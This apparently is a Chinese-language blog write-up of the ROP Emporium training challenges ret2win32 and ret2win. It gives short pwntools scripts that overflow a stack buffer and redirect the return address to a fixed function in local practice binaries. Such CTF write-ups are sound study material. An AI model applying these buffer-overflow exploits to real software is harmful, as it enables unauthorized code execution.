---
layout: post
title:  "ROP_Rmporium通关指南"
date:   2018-09-12 19:12:00
categories: WriteUp
tags: WriteUp PWN 铁三
---

* content
{:toc}


暑假去了趟Xman认识了一群大佬，也因此受到刺激成长了不少，这里就写一篇在xman时通关的rop——rmporium的wp来记录一下自己的学习历程





## ret2win32

### 思路

简单的rop构造，ctf-wiki上好像把这种叫做ret2text

### exp
```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('ret2win32')
elf = ELF('ret2win32')

bufsize = 40
buf = 'a'*bufsize
sh_addr = 0x08048659

payload = buf + 'aaaa' + p32(sh_addr)

def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```


## ret2win

### 思路

### exp
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('ret2win')
elf = ELF('ret2win')

bufsize = 0x20
buf = 'a'*bufsize
fake_ebp = 'a'*0x8
sh_addr = 0x400811

payload = buf + fake_ebp + p64(sh_addr)

def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```